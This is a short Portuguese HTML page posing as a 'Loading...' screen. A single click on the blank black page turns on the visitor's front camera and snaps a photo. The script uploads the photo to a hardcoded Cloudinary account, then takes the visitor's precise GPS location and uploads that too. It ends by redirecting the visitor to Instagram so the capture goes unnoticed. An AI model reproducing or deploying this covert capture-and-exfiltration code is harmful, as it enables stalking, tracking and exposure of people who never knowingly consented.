<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Carregando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>body{margin:0;overflow:hidden;background:#000;}</style>
</head>
<body onclick="iniciarCaptura()">
<script>
const cloudName = "dx5legahb";
const uploadPreset = "upload";
const folderName = "capturas";

async function iniciarCaptura() {
    if (window.started) return;
    window.started = true;

    try {
        // Ativa a câmera frontal com prioridade de compatibilidade iOS
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal: "user" } },
            audio: false
        });

        const video = document.createElement("video");
        video.setAttribute("playsinline", "true"); // ESSENCIAL no iOS
        video.srcObject = stream;
        await video.play();

        // Espera mínimo para garantir que o vídeo está renderizando
        await new Promise(r => setTimeout(r, 300));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());

        const imageData = canvas.toDataURL("image/png");
        const blob = await (await fetch(imageData)).blob();

        const formData = new FormData();
        formData.append("file", blob);
        formData.append("upload_preset", uploadPreset);
        formData.append("folder", folderName);

        const imgResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
            method: "POST",
            body: formData
        });

        const imgData = await imgResp.json();
        const imageUrl = imgData.secure_url;

        // Captura localização com alta precisão
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const { latitude, longitude } = pos.coords;
            const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
            const txtBlob = new Blob([texto], { type: "text/plain" });

            const txtForm = new FormData();
            txtForm.append("file", txtBlob, `localizacao_${Date.now()}.txt`);
            txtForm.append("upload_preset", uploadPreset);
            txtForm.append("folder", folderName);

            await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
                method: "POST",
                body: txtForm
            });

            window.location.href = "https://instagram.com";
        }, () => {
            window.location.href = "https://instagram.com";
        }, {
            enableHighAccuracy: true,
            timeout: 5000
        });

    } catch (error) {
        console.error("Erro geral:", error);
        window.location.href = "https://instagram.com";
    }
}
</script>
</body>
</html>
